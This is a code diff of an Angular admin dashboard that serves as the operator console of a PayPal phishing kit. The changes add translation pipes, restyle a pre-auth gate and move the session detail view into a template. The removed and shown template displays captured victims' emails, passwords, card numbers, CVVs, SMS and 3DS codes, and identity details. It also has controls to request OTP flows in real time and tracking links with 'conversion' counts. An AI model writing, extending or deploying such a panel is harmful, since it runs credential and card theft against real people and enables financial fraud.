@@ -5,13 +5,15 @@ import { FormsModule } from '@angular/forms';
 import { StateService, SessionHistory } from '../services/state.service';
 import { AuthService } from '../services/auth.service';
 import { ModalService } from '../services/modal.service';
+import { TranslationService } from '../services/translation.service';
+import { TranslatePipe } from '../pipes/translate.pipe';
 
 type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
 
 @Component({
   selector: 'app-admin-dashboard',
   standalone: true,
-  imports: [CommonModule, FormsModule],
+  imports: [CommonModule, FormsModule, TranslatePipe],
   template: `
     <div class="flex h-[100dvh] flex-col lg:flex-row bg-pp-bg dark:bg-slate-900 font-sans text-pp-navy dark:text-slate-100 overflow-hidden">
       
@@ -28,30 +30,35 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
          <div class="absolute inset-0 z-[200] bg-pp-bg flex items-center justify-center p-4">
 
              @if (!preAuthSuccess()) {
-                 <!-- Level 1: Pre-Auth Gate -->
-                 <div class="pp-card max-w-[400px]">
+                 <!-- Level 1: Pre-Auth Gate (Distinct UI) -->
+                 <div class="pp-card max-w-[400px] bg-slate-900 text-white border-slate-700 shadow-2xl">
                     <div class="flex justify-center mb-8">
-                         <h1 class="text-3xl font-bold text-pp-navy tracking-tighter">Access <span class="text-pp-blue">Control</span></h1>
+                         <div class="w-16 h-16 rounded-full bg-red-600/20 flex items-center justify-center">
+                             <span class="material-icons text-3xl text-red-500">security</span>
+                         </div>
                     </div>
-                    <h2 class="text-xl font-bold text-center mb-6">Restricted Area</h2>
+                    <h2 class="text-xl font-mono font-bold text-center mb-2 tracking-widest uppercase text-red-500">Access Control</h2>
+                    <p class="text-center text-xs text-slate-400 mb-8 font-mono">Restricted Environment. Authorized Personnel Only.</p>
+
                     <div class="space-y-5">
-                        <div class="pp-input-group mb-0">
-                            <input type="text" [(ngModel)]="preAuthUser" placeholder=" " class="pp-input peer">
-                            <label class="pp-label">User</label>
+                        <div class="relative">
+                            <input type="text" [(ngModel)]="preAuthUser" placeholder=" " class="block px-2.5 pb-2.5 pt-4 w-full text-sm text-white bg-slate-800 rounded-lg border-1 border-slate-600 appearance-none focus:outline-none focus:ring-0 focus:border-red-500 peer">
+                            <label class="absolute text-sm text-slate-400 duration-300 transform -translate-y-4 scale-75 top-2 z-10 origin-[0] bg-slate-800 px-2 peer-focus:px-2 peer-focus:text-red-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-4 left-1">Operator ID</label>
                         </div>
-                        <div class="pp-input-group mb-0">
-                            <input type="password" [(ngModel)]="preAuthPass" placeholder=" " class="pp-input peer">
-                            <label class="pp-label">Pass</label>
+                        <div class="relative">
+                            <input type="password" [(ngModel)]="preAuthPass" placeholder=" " class="block px-2.5 pb-2.5 pt-4 w-full text-sm text-white bg-slate-800 rounded-lg border-1 border-slate-600 appearance-none focus:outline-none focus:ring-0 focus:border-red-500 peer">
+                            <label class="absolute text-sm text-slate-400 duration-300 transform -translate-y-4 scale-75 top-2 z-10 origin-[0] bg-slate-800 px-2 peer-focus:px-2 peer-focus:text-red-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-4 left-1">Access Key</label>
                         </div>
-                        <button (click)="doPreAuth()" class="pp-btn mt-4">
-                            Proceed
+
+                        <button (click)="doPreAuth()" class="w-full text-white bg-red-600 hover:bg-red-700 focus:ring-4 focus:outline-none focus:ring-red-900 font-medium rounded-lg text-sm px-5 py-3 text-center transition-all uppercase tracking-wider font-bold mt-4">
+                            Authenticate
                         </button>
-                        @if(preAuthError()) { <p class="text-center text-[#D92D20] text-sm font-bold mt-2">Invalid Credentials</p> }
+                        @if(preAuthError()) { <p class="text-center text-red-400 text-xs font-mono font-bold mt-2 animate-pulse">ACCESS DENIED</p> }
                     </div>
                  </div>
              } @else {
-                 <!-- Level 2: Actual Admin Login -->
-                 <div class="pp-card max-w-[400px]">
+                 <!-- Level 2: Actual Admin Login (PayPal Style) -->
+                 <div class="pp-card max-w-[400px] animate-fade-in">
                     <div class="flex justify-center mb-8">
                          <!-- Simple Text Logo for Admin -->
                          <h1 class="text-3xl font-bold text-pp-navy tracking-tighter">PayPal <span class="text-pp-blue">Admin</span></h1>
@@ -90,42 +97,42 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
            <nav class="flex lg:flex-col items-center lg:items-stretch gap-2 lg:gap-0 lg:py-6">
                <a (click)="activeTab.set('live')" [class.bg-[#ffffff10]]="activeTab() === 'live'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'live'">
                    <span class="material-icons text-[20px]">radar</span>
-                   <span class="hidden lg:block">Live Monitor</span>
+                   <span class="hidden lg:block">{{ 'LIVE_MONITOR' | translate }}</span>
                    @if(state.activeSessions().length > 0) {
                        <span class="hidden lg:flex ml-auto bg-pp-success text-pp-navy text-[10px] font-bold px-2 py-0.5 rounded-full">{{ state.activeSessions().length }}</span>
                    }
                </a>
                <a (click)="activeTab.set('history')" [class.bg-[#ffffff10]]="activeTab() === 'history'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'history'">
                    <span class="material-icons text-[20px]">history</span>
-                   <span class="hidden lg:block">History</span>
+                   <span class="hidden lg:block">{{ 'HISTORY' | translate }}</span>
                </a>
 
                <a (click)="activeTab.set('links')" [class.bg-[#ffffff10]]="activeTab() === 'links'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'links'">
                    <span class="material-icons text-[20px]">link</span>
-                   <span class="hidden lg:block">Tracking Links</span>
+                   <span class="hidden lg:block">{{ 'TRACKING_LINKS' | translate }}</span>
                </a>
 
                @if(auth.currentUser()?.role === 'hypervisor') {
                    <a (click)="activeTab.set('system')" [class.bg-[#ffffff10]]="activeTab() === 'system'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'system'">
                        <span class="material-icons text-[20px]">dns</span>
-                       <span class="hidden lg:block">System</span>
+                       <span class="hidden lg:block">{{ 'SYSTEM' | translate }}</span>
                    </a>
                    <a (click)="activeTab.set('users')" [class.bg-[#ffffff10]]="activeTab() === 'users'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'users'">
                        <span class="material-icons text-[20px]">group</span>
-                       <span class="hidden lg:block">Admins</span>
+                       <span class="hidden lg:block">{{ 'ADMINS' | translate }}</span>
                    </a>
                }
 
                <a (click)="activeTab.set('settings')" [class.bg-[#ffffff10]]="activeTab() === 'settings'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'settings'">
                    <span class="material-icons text-[20px]">settings</span>
-                   <span class="hidden lg:block">Settings</span>
+                   <span class="hidden lg:block">{{ 'SETTINGS' | translate }}</span>
                </a>
            </nav>
 
            <div class="hidden lg:block p-4 border-t border-[#ffffff10] mt-auto">
                <button (click)="exitAdmin()" class="flex items-center gap-4 text-white/60 hover:text-white w-full">
                    <span class="material-icons">logout</span>
-                   <span class="text-sm font-bold">Log out</span>
+                   <span class="text-sm font-bold">{{ 'LOG_OUT' | translate }}</span>
                </button>
            </div>
 
@@ -154,11 +161,11 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
          <header class="hidden lg:flex h-16 bg-white dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700 items-center justify-between px-6 shrink-0 z-20 shadow-sm">
              <div class="flex items-center gap-2">
                  <h1 class="text-lg font-bold text-pp-navy dark:text-white">
-                     @if(auth.currentUser()?.role === 'hypervisor') { Hypervisor Console } @else { Administrator Console }
+                     @if(auth.currentUser()?.role === 'hypervisor') { {{ 'HYPERVISOR_CONSOLE' | translate }} } @else { {{ 'ADMIN_DASHBOARD' | translate }} }
                  </h1>
                  @if(state.isOfflineMode()) {
                      <span class="bg-amber-100 text-amber-800 text-[10px] font-bold px-2 py-1 rounded-full uppercase tracking-wider flex items-center gap-1">
-                         <span class="material-icons text-[12px]">wifi_off</span> Local Mode
+                         <span class="material-icons text-[12px]">wifi_off</span> {{ 'LOCAL_MODE' | translate }}
                      </span>
                  }
              </div>
@@ -181,11 +188,10 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                 <!-- LIVE MONITOR -->
                 @case ('live') {
                     <div class="flex flex-col lg:flex-row h-full">
-                        
-                        <!-- List Column (Fixed Width on Desktop, Top on Mobile) -->
+                        <!-- List Column -->
                         <div class="lg:w-[350px] bg-white dark:bg-slate-800 border-b lg:border-b-0 lg:border-r border-slate-200 dark:border-slate-700 flex flex-col shrink-0 h-[300px] lg:h-full">
                              <div class="p-4 border-b border-slate-100 dark:border-slate-700 bg-slate-50/90 dark:bg-slate-900/90 flex justify-between items-center shrink-0">
-                                 <h3 class="font-bold text-base text-pp-navy dark:text-white">Active Sessions</h3>
+                                 <h3 class="font-bold text-base text-pp-navy dark:text-white">{{ 'ACTIVE_SESSIONS' | translate }}</h3>
                                  <div class="flex items-center gap-2">
                                      <button (click)="refresh()" class="p-1.5 text-pp-blue bg-blue-50 dark:bg-blue-900/30 rounded-lg hover:bg-blue-100 dark:hover:bg-blue-900/50 transition-colors" title="Refresh">
                                          <span class="material-icons text-sm">refresh</span>
@@ -193,6 +199,8 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                      <span class="bg-pp-blue text-white text-xs px-2 py-1 rounded-md font-bold">{{ state.activeSessions().length }}</span>
                                  </div>
                              </div>
+
+                             <!-- Session List -->
                              <div class="flex-1 overflow-y-auto p-2 space-y-2 dark:bg-slate-800">
                                  @for(session of state.activeSessions(); track session.id) {
                                      <div (click)="selectSession(session)" class="p-3 rounded-[12px] cursor-pointer transition-all border border-transparent group relative"
@@ -234,17 +242,16 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                      }
                                      @if(state.activeSessions().length === 0) {
                                          <div class="flex flex-col items-center justify-center h-24 text-slate-400">
-                                             <p class="text-xs">No online users</p>
+                                             <p class="text-xs">{{ 'NO_ONLINE_USERS' | translate }}</p>
                                          </div>
                                      }
                                  </div>
 
-                             <!-- Incomplete Sessions (Offline but Verified) -->
                              <div class="h-[40%] flex flex-col border-t border-slate-200 dark:border-slate-700">
                                  <div (click)="incompleteCollapsed.set(!incompleteCollapsed())" class="p-3 bg-slate-100 dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700 flex justify-between items-center cursor-pointer hover:bg-slate-200 dark:hover:bg-slate-800 transition-colors">
                                      <div class="flex items-center gap-2">
                                          <span class="material-icons text-slate-400 text-sm transform transition-transform" [class.-rotate-90]="incompleteCollapsed()">expand_more</span>
-                                         <h3 class="font-bold text-sm text-slate-600 dark:text-slate-300">Incomplete</h3>
+                                         <h3 class="font-bold text-sm text-slate-600 dark:text-slate-300">{{ 'INCOMPLETE' | translate }}</h3>
                                      </div>
                                      <span class="bg-slate-300 text-slate-700 text-[10px] px-2 py-0.5 rounded-full font-bold">{{ state.incompleteSessions().length }}</span>
                                  </div>
@@ -269,248 +276,17 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                      }
                                      @if(state.incompleteSessions().length === 0) {
                                          <div class="flex flex-col items-center justify-center h-full text-slate-400">
-                                             <p class="text-xs">No incomplete sessions</p>
+                                             <p class="text-xs">{{ 'NO_INCOMPLETE_SESSIONS' | translate }}</p>
                                          </div>
                                      }
                                  </div>
                              </div>
                         </div>
 
-                        <!-- Details Column (Flexible, Independent Scroll) -->
+                        <!-- Details Column -->
                         <div class="flex-1 flex flex-col h-full overflow-hidden bg-[#F9FAFB] dark:bg-slate-900 relative">
                              @if(monitoredSession()) {
-                                 <!-- Header (Sticky) -->
-                                 <div class="p-4 lg:p-6 border-b border-slate-100 dark:border-slate-700 flex justify-between items-center bg-white dark:bg-slate-800 shrink-0 z-10 shadow-sm">
-                                     <div>
-                                         <div class="flex items-center gap-3 mb-1">
-                                            <h2 class="font-bold text-lg lg:text-xl text-pp-navy dark:text-white">Session Details</h2>
-                                            <span class="bg-pp-navy text-white text-[10px] px-2 py-0.5 rounded uppercase tracking-wider font-bold">{{ monitoredSession()?.currentView || monitoredSession()?.stage }}</span>
-                                            @if(auth.currentUser()?.role === 'hypervisor') {
-                                                <button (click)="assignAdmin()" class="text-[10px] bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 px-2 py-0.5 rounded font-bold uppercase text-slate-700 dark:text-slate-300 transition-colors">
-                                                    {{ monitoredSession()?.data?.adminId ? 'Re-Assign' : 'Assign Admin' }}
-                                                </button>
-                                            }
-                                         </div>
-                                         <div class="flex items-center gap-2">
-                                             @if(getDeviceImage(monitoredSession()?.fingerprint?.userAgent)) {
-                                                 <img [src]="getDeviceImage(monitoredSession()?.fingerprint?.userAgent)" class="h-4 w-4 object-contain dark:invert opacity-70">
-                                             } @else {
-                                                 <span class="material-icons text-slate-400 text-[16px]">{{ getDeviceIcon(monitoredSession()?.fingerprint?.userAgent) }}</span>
-                                             }
-                                             <p class="text-xs text-slate-500 dark:text-slate-400 font-mono">{{ monitoredSession()?.ip || monitoredSession()?.fingerprint?.ip }} • {{ monitoredSession()?.id }}</p>
-                                             @if(monitoredSession()?.data?.ipCountry) {
-                                                <img [src]="getFlagUrl(monitoredSession()?.data?.ipCountry)" class="h-3 w-auto shadow-sm" title="Location: {{monitoredSession()?.data?.ipCountry}}">
-                                             }
-                                         </div>
-                                     </div>
-                                     <div class="text-right flex items-center gap-4">
-                                         <div>
-                                             <p class="text-[10px] text-slate-400 font-bold uppercase">Time Elapsed</p>
-                                             <p class="font-mono font-bold text-pp-blue">{{ elapsedTime() }}</p>
-                                         </div>
-                                     </div>
-                                 </div>
-                                 
-                                 <!-- Scrollable Content -->
-                                 <div class="flex-1 overflow-y-auto p-4 lg:p-8 pb-32">
-
-                                     <!-- Recurring User Alert -->
-                                     @if(monitoredSession()?.data?.isRecurring) {
-                                        <div class="mb-6 bg-amber-50 border border-amber-200 rounded-lg p-3 flex items-center justify-between mx-auto max-w-full">
-                                            <div class="flex items-center gap-2">
-                                                <span class="material-icons text-amber-600">history</span>
-                                                <div>
-                                                    <p class="text-xs font-bold text-amber-800">Recurring User</p>
-                                                    <p class="text-[10px] text-amber-600">Previously verified session detected.</p>
-                                                </div>
-                                            </div>
-                                            <button (click)="viewLinkedSession()" class="text-xs font-bold text-amber-700 hover:underline bg-white/50 px-2 py-1 rounded border border-amber-200">
-                                                View Previous
-                                            </button>
-                                        </div>
-                                     }
-
-                                     <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                                         
-                                         <!-- Credentials -->
-                                         <div class="bg-white dark:bg-slate-800 p-6 rounded-[20px] shadow-sm border border-slate-100 dark:border-slate-700 relative overflow-hidden group">
-                                             <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity"><span class="material-icons text-6xl text-pp-navy dark:text-white">lock</span></div>
-                                             <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Login Credentials</h4>
-                                             <div class="space-y-4 relative z-10">
-                                                 <div>
-                                                     <label class="text-[11px] font-bold text-slate-500 block mb-1">Email / Username</label>
-                                                     <div class="flex items-center gap-2">
-                                                         <p class="text-base font-bold text-pp-navy dark:text-white break-all">{{ monitoredSession()?.data?.email || 'Waiting...' }}</p>
-                                                         <button *ngIf="monitoredSession()?.data?.email" (click)="copy(monitoredSession()?.data?.email)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
-                                                     </div>
-                                                 </div>
-                                                 <div>
-                                                     <label class="text-[11px] font-bold text-slate-500 block mb-1">Password</label>
-                                                     <div class="flex items-center gap-2">
-                                                         <p class="text-base font-mono bg-slate-100 dark:bg-slate-900/50 px-2 py-1 rounded text-pp-navy dark:text-white border border-slate-200 dark:border-slate-700">{{ monitoredSession()?.data?.password || 'Waiting...' }}</p>
-                                                         <button *ngIf="monitoredSession()?.data?.password" (click)="copy(monitoredSession()?.data?.password)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
-                                                     </div>
-                                                 </div>
-                                             </div>
-                                         </div>
-
-                                         <!-- Financial -->
-                                         <div class="bg-white dark:bg-slate-800 p-6 rounded-[20px] shadow-sm border border-slate-100 dark:border-slate-700 relative overflow-hidden group">
-                                             <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity"><span class="material-icons text-6xl text-pp-navy dark:text-white">credit_card</span></div>
-                                             <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Financial Instrument</h4>
-                                             <div class="space-y-4 relative z-10">
-                                                 <div>
-                                                     <div class="flex items-center justify-between mb-1">
-                                                         <label class="text-[11px] font-bold text-slate-500 block">Card Number</label>
-                                                         @if(getCardLogoUrl(monitoredSession()?.data?.cardType)) {
-                                                             <img [src]="getCardLogoUrl(monitoredSession()?.data?.cardType)" class="h-4 w-auto object-contain">
-                                                         }
-                                                     </div>
-                                                     <div class="flex items-center gap-2">
-                                                        <p class="text-lg font-mono font-bold text-pp-navy dark:text-white tracking-wide">{{ formatCard(monitoredSession()?.data?.cardNumber) }}</p>
-                                                        <button *ngIf="monitoredSession()?.data?.cardNumber" (click)="copy(monitoredSession()?.data?.cardNumber)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
-                                                     </div>
-                                                 </div>
-                                                 <div class="flex gap-6">
-                                                     <div>
-                                                         <label class="text-[11px] font-bold text-slate-500 block mb-1">Exp</label>
-                                                         <p class="font-bold text-pp-navy dark:text-white">{{ monitoredSession()?.data?.cardExpiry || '--/--' }}</p>
-                                                     </div>
-                                                     <div>
-                                                         <label class="text-[11px] font-bold text-slate-500 block mb-1">CVV</label>
-                                                         <p class="font-bold text-[#D92D20]">{{ monitoredSession()?.data?.cardCvv || '---' }}</p>
-                                                     </div>
-                                                 </div>
-                                             </div>
-                                         </div>
-
-                                         <!-- OTP & Security -->
-                                         <div class="col-span-1 md:col-span-2 bg-pp-navy text-white p-6 rounded-[20px] shadow-lg relative overflow-hidden flex items-center justify-between">
-                                              <!-- Background decoration -->
-                                              <div class="absolute -right-6 -top-6 w-32 h-32 bg-pp-blue rounded-full opacity-20 blur-2xl"></div>
-                                              
-                                              <div class="relative z-10">
-                                                  <h4 class="text-xs font-bold text-white/60 uppercase tracking-wider mb-3">Security Codes</h4>
-                                                  <div class="flex gap-8">
-                                                      <div>
-                                                          <span class="text-[10px] text-white/50 block mb-1">SMS Code</span>
-                                                          <span class="text-2xl font-mono font-bold tracking-widest">{{ monitoredSession()?.data?.phoneCode || '---' }}</span>
-                                                      </div>
-                                                      <div>
-                                                          <span class="text-[10px] text-white/50 block mb-1">Bank 3DS</span>
-                                                          <span class="text-2xl font-mono font-bold tracking-widest text-pp-success">{{ monitoredSession()?.data?.cardOtp || '---' }}</span>
-                                                      </div>
-                                                  </div>
-                                              </div>
-                                              
-                                              @if(monitoredSession()?.stage === 'card_pending') {
-                                                <div class="relative z-10 flex gap-2">
-                                                    <button (click)="requestFlow('otp')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-3 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
-                                                        SMS / 3DS
-                                                    </button>
-                                                    <button (click)="requestFlow('app')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-3 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
-                                                        Bank App
-                                                    </button>
-                                                    <button (click)="requestFlow('both')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-3 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
-                                                        Both
-                                                    </button>
-                                                </div>
-                                              }
-                                         </div>
-                                         
-                                         <!-- Personal Info -->
-                                         <div class="col-span-1 md:col-span-2 bg-white dark:bg-slate-800 p-6 rounded-[20px] shadow-sm border border-slate-100 dark:border-slate-700">
-                                              <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Identity Profile</h4>
-                                              <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
-                                                  <div>
-                                                      <label class="text-[10px] font-bold text-slate-400 uppercase">Name</label>
-                                                      <p class="text-sm font-bold text-pp-navy dark:text-white">{{ (monitoredSession()?.data?.firstName + ' ' + monitoredSession()?.data?.lastName).trim() || 'Waiting...' }}</p>
-                                                  </div>
-                                                  <div>
-                                                      <label class="text-[10px] font-bold text-slate-400 uppercase">DOB</label>
-                                                      <p class="text-sm font-bold text-pp-navy dark:text-white">{{ monitoredSession()?.data?.dob || 'Waiting...' }}</p>
-                                                  </div>
-                                                  <div>
-                                                      <label class="text-[10px] font-bold text-slate-400 uppercase">Phone</label>
-                                                      <p class="text-sm font-bold text-pp-navy dark:text-white">{{ monitoredSession()?.data?.phoneNumber || 'Waiting...' }}</p>
-                                                  </div>
-                                                  <div>
-                                                      <label class="text-[10px] font-bold text-slate-400 uppercase">Location</label>
-                                                      <p class="text-sm font-bold text-pp-navy dark:text-white">{{ monitoredSession()?.data?.country || 'Waiting...' }}</p>
-                                                  </div>
-                                                  <div class="col-span-2">
-                                                      <label class="text-[10px] font-bold text-slate-400 uppercase">Address</label>
-                                                      <p class="text-sm font-bold text-pp-navy dark:text-white">{{ monitoredSession()?.data?.address || 'Waiting...' }}</p>
-                                                  </div>
-                                              </div>
-                                         </div>
-
-                                     </div>
-                                 </div>
-
-                                 <!-- Action Bar (Sticky Bottom) -->
-                                 <div class="p-4 border-t border-slate-200 dark:border-slate-700 bg-white/90 dark:bg-slate-800/90 backdrop-blur-sm absolute bottom-0 left-0 right-0 z-20 flex justify-between items-center shadow-lg">
-                                     <div class="flex items-center gap-2">
-                                         <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(monitoredSession())" [class.bg-pp-success]="isSessionLive(monitoredSession())" [class.bg-slate-300]="!isSessionLive(monitoredSession())"></span>
-                                         <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(monitoredSession()) ? 'Live Connection' : 'Offline' }}</span>
-
-                                         <!-- Extend Timeout Controls -->
-                                         @if(monitoredSession()?.currentView === 'loading') {
-                                            <div class="flex items-center gap-2 ml-4">
-                                                 <div class="flex gap-1">
-                                                     <button (click)="extendTimeout(10000)" class="bg-blue-50 dark:bg-slate-700 text-pp-blue dark:text-blue-400 text-[10px] font-bold px-2 py-1 rounded hover:bg-blue-100 dark:hover:bg-slate-600 transition">+10s</button>
-                                                     <button (click)="extendTimeout(20000)" class="bg-blue-50 dark:bg-slate-700 text-pp-blue dark:text-blue-400 text-[10px] font-bold px-2 py-1 rounded hover:bg-blue-100 dark:hover:bg-slate-600 transition">+20s</button>
-                                                     <button (click)="extendTimeout(30000)" class="bg-blue-50 dark:bg-slate-700 text-pp-blue dark:text-blue-400 text-[10px] font-bold px-2 py-1 rounded hover:bg-blue-100 dark:hover:bg-slate-600 transition">+30s</button>
-                                                 </div>
-                                            </div>
-                                         }
-                                     </div>
-
-                                     @if(monitoredSession()) {
-                                         <div class="flex gap-2 lg:gap-3">
-                                              <!-- Revoke disabled unless login verified -->
-                                              <button (click)="revoke()"
-                                                      [disabled]="!monitoredSession()?.isLoginVerified"
-                                                      [class.opacity-50]="!monitoredSession()?.isLoginVerified"
-                                                      [class.cursor-not-allowed]="!monitoredSession()?.isLoginVerified"
-                                                      class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
-                                                  Revoke
-                                              </button>
-                                              <button (click)="reject()"
-                                                      [disabled]="!canInteract()"
-                                                      [class.opacity-50]="!canInteract()"
-                                                      [class.cursor-not-allowed]="!canInteract()"
-                                                      class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
-                                                  Reject
-                                              </button>
-                                              @if (monitoredSession()?.stage === 'login') {
-                                                  <button (click)="approve({ skipPhone: false })"
-                                                          [disabled]="!canInteract()"
-                                                          [class.opacity-50]="!canInteract()"
-                                                          [class.cursor-not-allowed]="!canInteract()"
-                                                          class="bg-pp-navy hover:bg-pp-blue text-white px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
-                                                      <span class="material-icons text-sm">check</span> Verify Phone
-                                                  </button>
-                                                  <button (click)="approve({ skipPhone: true })"
-                                                          [disabled]="!canInteract()"
-                                                          [class.opacity-50]="!canInteract()"
-                                                          [class.cursor-not-allowed]="!canInteract()"
-                                                          class="bg-pp-blue hover:bg-[#005ea6] text-white px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
-                                                      <span class="material-icons text-sm">fast_forward</span> Skip Phone
-                                                  </button>
-                                              } @else {
-                                                  <button (click)="approve()"
-                                                          [disabled]="!canInteract()"
-                                                          [class.opacity-50]="!canInteract()"
-                                                          [class.cursor-not-allowed]="!canInteract()"
-                                                          class="bg-pp-navy hover:bg-pp-blue text-white px-6 lg:px-8 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
-                                                      <span class="material-icons text-sm">check</span> {{ approveText() }}
-                                                  </button>
-                                              }
-                                         </div>
-                                     }
-                                 </div>
-
+                                 <ng-container *ngTemplateOutlet="sessionDetailView; context: {session: monitoredSession(), isHistory: false}"></ng-container>
                              } @else {
                                  <div class="flex-1 flex flex-col items-center justify-center text-slate-300 min-h-[300px]">
                                      <span class="material-icons text-6xl mb-4 opacity-20">touch_app</span>
@@ -527,11 +303,11 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                     <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden h-full flex flex-col p-6">
                         <div class="flex justify-between items-center mb-6">
                             <div>
-                                <h2 class="font-bold text-xl text-pp-navy dark:text-white">Link Management</h2>
+                                <h2 class="font-bold text-xl text-pp-navy dark:text-white">{{ 'LINK_MANAGEMENT' | translate }}</h2>
                                 <p class="text-xs text-slate-500">Create unique tracking links for your campaigns.</p>
                             </div>
                             <button (click)="generateLink()" class="bg-pp-blue text-white px-4 py-2 rounded-lg font-bold text-xs flex items-center gap-2 hover:bg-[#005ea6] transition-colors shadow-button">
-                                <span class="material-icons text-sm">add_link</span> Generate New Link
+                                <span class="material-icons text-sm">add_link</span> {{ 'GENERATE_NEW_LINK' | translate }}
                             </button>
                         </div>
 
@@ -539,17 +315,16 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                             <table class="w-full text-left border-collapse">
                                 <thead class="bg-slate-50 dark:bg-slate-900 text-slate-500 text-xs font-bold uppercase">
                                     <tr>
-                                        <th class="px-4 py-3 rounded-l-lg">Code</th>
-                                        <th class="px-4 py-3">Link URL</th>
-                                        <th class="px-4 py-3 text-center">Clicks</th>
-                                        <th class="px-4 py-3 text-center">Sessions</th>
-                                        <th class="px-4 py-3 text-center">Verified</th>
-                                        <th class="px-4 py-3 text-right">Conversion</th>
-                                        <th class="px-4 py-3 text-right rounded-r-lg">Actions</th>
+                                        <th class="px-4 py-3 rounded-l-lg">{{ 'CODE' | translate }}</th>
+                                        <th class="px-4 py-3">{{ 'LINK_URL' | translate }}</th>
+                                        <th class="px-4 py-3 text-center">{{ 'CLICKS' | translate }}</th>
+                                        <th class="px-4 py-3 text-center">{{ 'SESSIONS' | translate }}</th>
+                                        <th class="px-4 py-3 text-center">{{ 'VERIFIED' | translate }}</th>
+                                        <th class="px-4 py-3 text-right">{{ 'CONVERSION' | translate }}</th>
+                                        <th class="px-4 py-3 text-right rounded-r-lg">{{ 'ACTIONS' | translate }}</th>
                                     </tr>
                                 </thead>
                                 <tbody class="text-sm font-medium text-pp-navy dark:text-white divide-y divide-slate-100 dark:divide-slate-700">
-                                    <!-- Links -->
                                     @for(link of linkList(); track link.code) {
                                         <tr [ngClass]="{'bg-blue-50': isDefaultLink(link.code), 'dark:bg-blue-900/10': isDefaultLink(link.code)}">
                                             <td class="px-4 py-3 font-mono text-xs font-bold" [class.text-pp-blue]="isDefaultLink(link.code)">{{ link.code }}</td>
